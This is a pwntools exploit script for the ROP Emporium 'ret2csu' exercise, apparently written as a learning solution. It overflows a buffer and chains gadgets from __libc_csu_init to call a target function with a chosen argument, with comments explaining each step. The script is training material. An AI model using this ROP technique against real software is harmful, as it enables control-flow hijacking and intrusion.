from pwn import *

context(terminal = ['tmux', 'new-window'])

p = gdb.debug("./ret2csu", gdbscript = '''
b *0x40089a
init-peda
''')

context.log_level = "DEBUG"

junk = "A"*40
# I search in the disassembled libc_csu_init for useful gadgets
# pdf @sym.__libc_csu_init
pop = p64(0x40089a) # pop rbx, rbp, r12, r13 ,r14, r15, ret
mov = p64(0x400880) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]
ret2win = p64(0x4007b1)
argv = p64(0xdeadcafebabebeef)
# all right, the argument to call needs to be a pointer, so we can't put
# the ret2win address in there, cause the pointer would be in PLT, but as you know
# the plt is only for dynamically linked funtions, while ret2win is a static one
# so what we do is inspect the &_DYNAMIC
# ie. .dynamic section of executable we can find pointers to _init and _fini section
# x/5g &_DYNAMIC
# 0x600e30:       0xc     0x400560
# we disassemble 0x400560 and it looks to be _init
_init = p64(0x600e38)
# another thing we have to worry about is : add rsp, 8
#
#0x00400889      41ff14dc       call qword [r12 + rbx*8]
#|      :|   0x0040088d                     add  rbx, 1
#|      :|   0x00400891                     cmp  rbp, rbx
#|      `==< 0x00400894                     jne  0x400880 ; sym.__libc_csu_init+0x40
#|       |   ; CODE XREF from sym.__libc_csu_init (0x400874)
#|       `-> 0x00400896      4883c408       add rsp, 8
# so what we are gonna do is padding a value there
# and if we want the whle thing to continue all right, we need to be careful at the cmp
# after that, we just put another 6 0's on stack because there are some pops before ret
payload = junk + pop + p64(0) + p64(1) + _init + p64(0)*2 + argv + mov + p64(0)*7 + ret2win

p.sendline(payload)

p.interactive()
# inspiration : https://www.rootnetsec.com/ropemporium-ret2csu/
#https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html
